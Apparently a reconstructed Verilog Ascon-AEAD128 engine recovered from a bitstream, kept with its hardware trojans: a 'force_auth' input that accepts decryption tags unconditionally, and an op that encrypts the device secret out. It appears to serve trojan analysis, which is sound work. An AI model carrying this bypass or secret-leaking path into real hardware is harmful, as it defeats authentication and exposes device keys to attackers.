// ascon_engine.v - Ascon-AEAD128 (NIST SP 800-232) authenticated-encryption
// engine, one permutation round per clock.
//
// Behavioral reconstruction of the crypto_eeprom_top accelerator datapath,
// recovered by reverse-engineering the bitstream and matched bit-exact against
// the validated reference work/sim/ascon_ref.py (itself structurally checked
// against the official Ascon reference).
//
// Buffers live in the parent (crypto_top). The parent returns the raw 16 bytes
// of any requested block (zeros beyond what was written); THIS module applies
// Ascon's 0x01 padding and length masking. Byte 0 of a block is the MSB.
`default_nettype none

module ascon_engine (
    input  wire         clk,
    input  wire         rst_n,
    input  wire         start,       // 1-cycle pulse
    input  wire [1:0]   op,          // 1=enc 2=dec 3=encrypt-secret
    input  wire [9:0]   ad_len,      // bytes
    input  wire [9:0]   msg_len,     // bytes
    input  wire [127:0] key,
    input  wire [127:0] nonce,       // effective nonce (parent applies cfg source)
    // wide block read: parent returns raw bytes of block rd_blk
    output reg  [9:0]   rd_blk,
    input  wire [127:0] ad_block,
    input  wire [127:0] msg_block,   // for op=3 parent routes the device secret here
    // wide block write (OUT buffer)
    output reg          out_we,
    output reg  [9:0]   out_blk,
    output reg  [127:0] out_block,
    // tag I/O
    input  wire [127:0] tag_in,
    input  wire         force_auth,  // Trojan-B hook: accept tag unconditionally
    output reg  [127:0] tag_out,
    // status
    output reg          busy,
    output reg          done,
    output reg          auth_ok,
    output reg          auth_fail
);
    function [7:0] rc(input [3:0] r);
        rc = 8'hf0 - {r,4'b0} + {4'b0,r};
    endfunction
    function [63:0] rotr(input [63:0] x, input integer n);
        rotr = (x >> n) | (x << (64-n));
    endfunction

    localparam [63:0] IV = 64'h00001000808c0001;
    reg [63:0] X0,X1,X2,X3,X4;
    reg [63:0] k0,k1;

    // one permutation round (combinational next-state of X*)
    task automatic do_round(input [3:0] ri);
        reg [63:0] a0,a1,a2,a3,a4,t0,t1,t2,t3,t4;
        begin
            a0=X0; a1=X1; a2=X2 ^ {56'b0, rc(ri)}; a3=X3; a4=X4;
            a0=a0^a4; a4=a4^a3; a2=a2^a1;
            t0=(~a0)&a1; t1=(~a1)&a2; t2=(~a2)&a3; t3=(~a3)&a4; t4=(~a4)&a0;
            a0=a0^t1; a1=a1^t2; a2=a2^t3; a3=a3^t4; a4=a4^t0;
            a1=a1^a0; a0=a0^a4; a3=a3^a2; a2=~a2;
            X0 = a0 ^ rotr(a0,19) ^ rotr(a0,28);
            X1 = a1 ^ rotr(a1,61) ^ rotr(a1,39);
            X2 = a2 ^ rotr(a2, 1) ^ rotr(a2, 6);
            X3 = a3 ^ rotr(a3,10) ^ rotr(a3,17);
            X4 = a4 ^ rotr(a4, 7) ^ rotr(a4,41);
        end
    endtask

    // pad/mask a raw block for absorb (plaintext-style: 0x01 pad)
    // L=length for this phase, bi=block index. byte p (p=0 is MSB).
    function [127:0] padblk(input [127:0] raw, input [9:0] L, input [9:0] bi);
        integer p; reg [10:0] g; reg [7:0] by;
        begin
            padblk = 128'b0;
            for (p=0;p<16;p=p+1) begin
                g = {bi[5:0],4'b0} + p[10:0];
                if (g < L)        by = raw[127-8*p -: 8];
                else if (g == L)  by = 8'h01;
                else              by = 8'h00;
                padblk[127-8*p -: 8] = by;
            end
        end
    endfunction

    // raw ciphertext block for decrypt (no pad, zeros beyond length)
    function [127:0] ctblk(input [127:0] raw, input [9:0] L, input [9:0] bi);
        integer p; reg [10:0] g;
        begin
            ctblk = 128'b0;
            for (p=0;p<16;p=p+1) begin
                g = {bi[5:0],4'b0} + p[10:0];
                if (g < L) ctblk[127-8*p -: 8] = raw[127-8*p -: 8];
            end
        end
    endfunction

    localparam S_IDLE=0,S_INIT=1,S_INITK=2,S_AD=3,S_ADP=4,S_DOM=5,
               S_MSG=6,S_MSGP=7,S_FINK=8,S_FINP=9,S_FINK2=10,S_TAG=11,S_DONE=12;
    reg [3:0] st, rnd;
    reg [9:0] blk, nblk_ad, nblk_msg;
    reg [1:0] cur_op;
    reg [9:0] cur_adlen, cur_msglen;
    reg [127:0] rate, inblk, pblk;
    reg [9:0] clast;
    integer pp; reg [10:0] gg;

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            st<=S_IDLE; busy<=0; done<=0; auth_ok<=0; auth_fail<=0; out_we<=0; rd_blk<=0;
        end else begin
            out_we<=0; done<=0;
            case (st)
            S_IDLE: if (start) begin
                busy<=1; auth_ok<=0; auth_fail<=0;
                cur_op<=op;
                cur_adlen <= (op==2'd3)?10'd0:ad_len;
                cur_msglen<= (op==2'd3)?10'd16:msg_len;
                nblk_ad  <= (op==2'd3)?10'd0 : ((ad_len==0)?10'd0:((ad_len>>4)+10'd1));
                nblk_msg <= ((op==2'd3)?10'd16:msg_len)>>4; // temp; +1 below
                k0<=key[127:64]; k1<=key[63:0];
                X0<=IV; X1<=key[127:64]; X2<=key[63:0]; X3<=nonce[127:64]; X4<=nonce[63:0];
                rnd<=0; st<=S_INIT;
            end
            S_INIT: begin
                do_round(rnd);
                if (rnd==4'd11) begin st<=S_INITK; end
                rnd<=rnd+1;
            end
            S_INITK: begin
                X3<=X3^k0; X4<=X4^k1;
                nblk_msg<=(cur_msglen>>4)+10'd1;
                blk<=0; rd_blk<=0;
                if (nblk_ad==0) st<=S_DOM; else st<=S_AD;
            end
            // ---- associated data ----
            S_AD: begin
                inblk = padblk(ad_block, cur_adlen, blk);
                X0<=X0^inblk[127:64]; X1<=X1^inblk[63:0];
                rnd<=4; st<=S_ADP;
            end
            S_ADP: begin
                do_round(rnd);
                if (rnd==4'd11) begin
                    if (blk==nblk_ad-1) st<=S_DOM;
                    else begin blk<=blk+1; rd_blk<=blk+1; st<=S_AD; end
                end
                rnd<=rnd+1;
            end
            S_DOM: begin
                X4<=X4 ^ 64'h8000000000000000;
                blk<=0; rd_blk<=0; st<=S_MSG;
            end
            // ---- message (enc/dec) ----
            S_MSG: begin
                rate = {X0,X1};
                if (cur_op==2'd2) begin
                    // decrypt
                    inblk = ctblk(msg_block, cur_msglen, blk);
                    pblk  = rate ^ inblk;                 // plaintext (valid bytes < len)
                    out_block<=pblk; out_blk<=blk; out_we<=1;
                    clast = cur_msglen - {blk[5:0],4'b0};  // c_lastlen for last block
                    if (blk != nblk_msg-1) begin
                        X0<=inblk[127:64]; X1<=inblk[63:0];   // full block
                    end else begin
                        // last block: byte p<clast -> C; p==clast -> S^0x01; else S
                        for (pp=0;pp<16;pp=pp+1) begin
                            gg = pp;
                            if (gg < clast)      rate[127-8*pp -: 8] = inblk[127-8*pp -: 8];
                            else if (gg==clast)  rate[127-8*pp -: 8] = rate[127-8*pp -: 8] ^ 8'h01;
                        end
                        X0<=rate[127:64]; X1<=rate[63:0];
                    end
                end else begin
                    // encrypt (op 1 or 3)
                    inblk = padblk((cur_op==2'd3)?msg_block:msg_block, cur_msglen, blk);
                    rate = rate ^ inblk;
                    X0<=rate[127:64]; X1<=rate[63:0];
                    out_block<=rate; out_blk<=blk; out_we<=1;
                end
                if (blk==nblk_msg-1) st<=S_FINK;   // no perm after last
                else begin rnd<=4; st<=S_MSGP; end
            end
            S_MSGP: begin
                do_round(rnd);
                if (rnd==4'd11) begin blk<=blk+1; rd_blk<=blk+1; st<=S_MSG; end
                rnd<=rnd+1;
            end
            // ---- finalization ----
            S_FINK: begin X2<=X2^k0; X3<=X3^k1; rnd<=0; st<=S_FINP; end
            S_FINP: begin
                do_round(rnd);
                if (rnd==4'd11) st<=S_FINK2;
                rnd<=rnd+1;
            end
            S_FINK2: begin
                X3<=X3^k0; X4<=X4^k1; st<=S_TAG;
            end
            S_TAG: begin
                tag_out<={X3,X4};
                if (cur_op==2'd2) begin
                    if (({X3,X4}==tag_in) || force_auth) auth_ok<=1; else auth_fail<=1;
                end
                st<=S_DONE;
            end
            S_DONE: begin busy<=0; done<=1; st<=S_IDLE; end
            default: st<=S_IDLE;
            endcase
        end
    end
endmodule
`default_nettype wire
